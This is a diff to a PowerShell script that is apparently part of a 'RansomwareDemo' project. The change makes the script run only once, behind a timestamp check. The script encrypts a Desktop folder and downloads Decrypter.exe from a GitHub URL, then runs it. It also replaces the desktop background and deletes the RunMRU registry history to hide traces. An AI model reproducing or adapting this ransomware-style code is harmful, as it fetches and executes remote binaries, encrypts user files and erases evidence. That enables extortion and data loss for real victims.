@@ -1,13 +1,16 @@
 # Paths ------------------------
-$tempPath = [System.IO.Path]::Combine([System.Environment]::GetEnvironmentVariable("SystemRoot"), "Temp")
+$tempPath = [System.Environment]::GetEnvironmentVariable("TEMP")
 $privateKeyFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
 $folderToEncrypt = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
 $decrypterFolder = [System.Environment]::GetFolderPath('Desktop')
+$decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
 
 $backgroundURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/res/black-solid-color-background.jpg"
 $decrypterURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter.exe"
 # ------------------------------
 
+If (-Not (Test-Path -path "$tempPath\timestamp.txt"))
+{
 # Change the desktop background
 Invoke-WebRequest $backgroundURL -OutFile "$tempPath\black.jpg"
 
@@ -115,8 +118,9 @@ $rsa.Dispose()
 Start-Sleep 1
 
 # Download and execute the Decrypter
-$decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
 Invoke-WebRequest -Uri $decrypterURL -OutFile $decrypterPath
+}
+
 Start-Process -FilePath $decrypterPath
 
 # Remove all RunMRU (Run History) entries from the Windows registry to hide traces
